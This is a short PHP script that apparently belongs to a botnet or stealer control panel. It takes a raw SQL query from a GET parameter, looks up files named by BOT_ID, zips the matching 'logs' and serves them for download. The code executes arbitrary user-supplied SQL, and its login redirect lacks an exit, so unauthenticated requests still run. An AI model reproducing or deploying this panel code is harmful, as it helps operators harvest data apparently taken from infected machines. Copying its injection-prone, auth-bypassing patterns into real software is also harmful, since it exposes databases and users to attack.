<?php
    include('global.php');
    session_start();
    if (!isset($_SESSION['username'])) header('Location: login.php');
    if (!empty($_GET['query']))
    {
        $db = new SQLite3('info/info.db');
        $result = $db->query($_GET['query']);
        $zipname = 'logs.zip';
        $zip = new ZipArchive;
        $zip->open($zipname, ZipArchive::CREATE);
        while ($row = $result->fetchArray())
        {
            $file = glob("files/*-{$row['BOT_ID']}*")[0];
            if ($file) $zip->addFile($file, substr($file, 6));
        }
        $db->close();
        $zip->close();
        if (file_exists($zipname))
        {
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename='.$zipname);
            header('Content-Length: '.filesize($zipname));
            readfile($zipname);
            unlink($zipname);
        }
        else header('Location: reports.php');
    }
?>